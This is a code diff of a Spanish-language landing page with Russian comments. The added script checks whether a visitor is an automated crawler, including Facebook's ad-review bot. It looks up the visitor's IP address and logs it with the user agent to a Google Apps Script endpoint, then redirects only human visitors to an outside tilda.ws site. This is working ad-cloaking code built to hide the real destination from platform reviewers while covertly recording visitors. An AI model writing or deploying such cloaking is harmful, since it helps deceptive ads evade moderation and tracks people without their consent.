@@ -1,75 +1,47 @@
-<!DOCTYPE html>
-<html lang="es">
-<head>
-  <meta charset="UTF-8">
-  <title>Bienvenido</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 30vh; }
-  </style>
-</head>
-<body>
-  <h1>Bienvenido</h1>
+<script>
+  async function detect() {
+    const ua = navigator.userAgent || '';
+    const webdriver = navigator.webdriver ? '1' : '0';
 
-  <!-- Facebook Pixel -->
-  <script>
-    !function(f,b,e,v,n,t,s){
-      if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-      n.queue=[];t=b.createElement(e);t.async=!0;
-      t.src=v;s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)
-    }(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', 'ВАШ_PIXEL_ID');
-    fbq('track', 'PageView');
-  </script>
-  <noscript>
-    <img height="1" width="1" style="display:none"
-         src="https://www.facebook.com/tr?id=ВАШ_PIXEL_ID&ev=PageView&noscript=1"/>
-  </noscript>
+    const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
+    const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));
 
-  <!-- Антибот -->
-  <script>
-    async function detect() {
-      const ua = navigator.userAgent || '';
-      const webdriver = navigator.webdriver ? '1' : '0';
+    let ip = '_';
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const json = await res.json();
+      ip = json.ip;
+    } catch (e) {}
 
-      const suspiciousUAs = [/bot/i, /crawl/i, /spider/i, /facebookexternalhit/i];
-      const isUASuspicious = suspiciousUAs.some(rx => rx.test(ua));
+    const isBot = webdriver === '1' || isUASuspicious;
 
-      let ip = '_';
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const json = await res.json();
-        ip = json.ip;
-      } catch (e) {}
+    // Вывод на экран:
+    document.body.innerHTML += `
+      <p>IP: ${ip}</p>
+      <p>WebDriver: ${webdriver}</p>
+      <p>UserAgent: ${ua}</p>
+      <p>isUASuspicious: ${isUASuspicious}</p>
+      <p>Результат: ${isBot ? 'BOT 🚫' : 'OK ✅'}</p>
+    `;
 
-      const isBot = webdriver === '1' || isUASuspicious;
+    // Лог в таблицу
+    fetch('https://script.google.com/macros/s/AKfycbxTdOYf8RqR0Nn11OnsdnCpcryYBAPQiTkPnLwSjwg0QayMiVWOJiJ84OCkk2kViovhlQ/exec', {
+      method: 'POST',
+      body: JSON.stringify({
+        ip,
+        ua,
+        webdriver,
+        result: isBot ? 'bot' : 'ok'
+      })
+    });
 
-      // лог в Google Sheets
-      fetch('https://script.google.com/macros/s/AKfycbzD5oInQ5F1ibaYjFpPoKH477Pnfcz-KFboqeZLB87R_xRPigwneJdsyPMKxmr-o1WrJg/exec', {
-        method: 'POST',
-        body: JSON.stringify({
-          ip,
-          ua,
-          webdriver,
-          result: isBot ? 'bot' : 'ok'
-        })
-      });
-
-      // Редирект, если не бот
-      if (!isBot) {
-        setTimeout(() => {
-          window.location.href = 'http://argentinaforreal.tilda.ws/';
-        }, 1000);
-      } else {
-        document.querySelector('h1').textContent = 'Gracias por visitar';
-      }
+    // Редирект
+    if (!isBot) {
+      setTimeout(() => {
+        window.location.href = 'http://argentinaforreal.tilda.ws/';
+      }, 1000);
     }
+  }
 
-    detect();
-  </script>
-</body>
-</html>
+  detect();
+</script>
